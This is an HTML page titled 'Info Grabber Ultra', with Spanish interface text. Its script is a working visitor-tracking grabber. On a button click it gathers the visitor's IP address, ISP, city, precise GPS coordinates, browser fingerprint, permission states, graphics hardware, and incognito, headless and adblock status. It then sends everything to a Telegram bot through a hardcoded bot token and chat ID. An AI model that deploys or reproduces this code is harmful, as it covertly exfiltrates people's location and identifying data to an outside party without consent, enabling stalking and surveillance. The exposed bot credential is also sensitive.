<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Info Grabber Ultra</title>
  <style>
    body { font-family: Arial; padding: 20px; background: #f0f0f0; }
    .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 700px; margin: auto; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    pre { white-space: pre-wrap; word-wrap: break-word; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Recolectar informaci贸n avanzada</h2>
    <button id="startBtn">Recolectar info con checks extras</button>
    <pre id="result">Esperando acci贸n...</pre>
  </div>

<script>
const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag";
const CHAT_ID = "6065284869";

const resultEl = document.getElementById("result");
const startBtn = document.getElementById("startBtn");

let humanInteraction = false;
["click", "mousemove", "keydown", "touchstart"].forEach(event => {
  window.addEventListener(event, () => { humanInteraction = true; }, { once: true });
});

// Detectar navegador headless b谩sico
function detectHeadless() {
  const isHeadless = navigator.webdriver ||
                     !navigator.plugins.length ||
                     !navigator.languages ||
                     /HeadlessChrome/.test(navigator.userAgent);
  return isHeadless ? "S铆" : "No";
}

// Detectar modo inc贸gnito (FileSystem API)
async function detectIncognito() {
  return new Promise((resolve) => {
    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
    if (!fs) {
      resolve("No detectable");
    } else {
      fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("S铆"));
    }
  });
}

// Fingerprint simple
function getFingerprint() {
  return btoa([
    navigator.userAgent,
    navigator.language,
    screen.width + 'x' + screen.height,
    navigator.hardwareConcurrency || "n/a",
    Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
  ].join('|'));
}

// Comprobar permisos (c谩mara, micr贸fono, localizaci贸n)
async function checkPermissions() {
  if (!navigator.permissions) return "No soportado";
  try {
    const cams = await navigator.permissions.query({name:"camera"});
    const mics = await navigator.permissions.query({name:"microphone"});
    const geo = await navigator.permissions.query({name:"geolocation"});
    return `C谩mara: ${cams.state}, Micr贸fono: ${mics.state}, Geoloc: ${geo.state}`;
  } catch {
    return "Error consulta permisos";
  }
}

// Comprobar si est谩 aceleraci贸n hardware activada
function checkHardwareAcceleration() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return "No WebGL";
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    if (!debugInfo) return "No debug info";
    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    return renderer || "No renderer";
  } catch {
    return "Error WebGL";
  }
}

// Detectar adblock (intentando fetch a dominio com煤n bloqueado)
async function detectAdblock() {
  try {
    const res = await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {method:"HEAD", mode:"no-cors"});
    return "No detectado";
  } catch {
    return "Probable AdBlock";
  }
}

// Detectar discrepancia entre timezone y locale
function checkTimezoneLocale() {
  try {
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const lang = navigator.language || navigator.userLanguage;
    // Aqu铆 un chequeo b谩sico: si es idioma en espa帽ol pero timezone est谩 en UTC puede ser sospechoso
    if (lang.startsWith('es') && tz.startsWith('UTC')) return "Discrepancia detectada";
    return "OK";
  } catch {
    return "No disponible";
  }
}

async function getIPInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    return await res.json();
  } catch {
    return null;
  }
}

async function sendToTelegram(message) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
      }),
    });
  } catch(e) {
    console.warn("Error enviando a Telegram:", e);
  }
}

async function collectAndSend() {
  resultEl.textContent = " Recopilando informaci贸n avanzada...";

  const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
    getIPInfo(),
    new Promise((res, rej) => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
      } else rej();
    }),
    detectIncognito(),
    checkPermissions(),
    detectAdblock()
  ]);

  let message = "";

  if (ipRes.status === "fulfilled" && ipRes.value) {
    const ip = ipRes.value;
    message += `IP: ${ip.ip}
ISP: ${ip.org}
ASN: ${ip.asn}
Proxy/VPN/Tor: ${ip.proxy ? "S铆" : "No"}
Ciudad: ${ip.city}
Regi贸n: ${ip.region}
Pa铆s: ${ip.country_name}
Versi贸n IP: ${ip.version}
`;
  } else {
    message += "No se pudo obtener IP\n";
  }

  message += `User-Agent: ${navigator.userAgent}
Navegador Headless: ${detectHeadless()}
Modo Inc贸gnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
Interacci贸n Humana: ${humanInteraction ? "S铆" : "No"}
Pantalla: ${screen.width}x${screen.height}
Resoluci贸n disponible: ${screen.availWidth}x${screen.availHeight}
Touch Support: ${'ontouchstart' in window ? 'S铆' : 'No'}
Plataforma: ${navigator.platform}
Fingerprint: ${getFingerprint()}
Permisos (c谩mara, micr贸fono, geoloc): ${permStatus.status === "fulfilled" ? permStatus.value : "No disponible"}
Aceleraci贸n hardware (WebGL renderer): ${checkHardwareAcceleration()}
Timezone vs Locale: ${checkTimezoneLocale()}
AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
Hora: ${new Date().toLocaleString()}
`;

  resultEl.textContent = message;
  await sendToTelegram(message);

  if (geoRes.status === "fulfilled") {
    const { latitude, longitude, accuracy } = geoRes.value.coords;
    const locationInfo = `\nUbicaci贸n Precisa:
Latitud: ${latitude}
Longitud: ${longitude}
Precisi贸n: ${accuracy} metros
Hora: ${new Date().toLocaleString()}
`;
    resultEl.textContent += locationInfo;
    await sendToTelegram(locationInfo);
  } else {
    resultEl.textContent += "\nUbicaci贸n precisa no disponible o rechazada.";
  }
}

startBtn.onclick = collectAndSend;

</script>
</body>
</html>
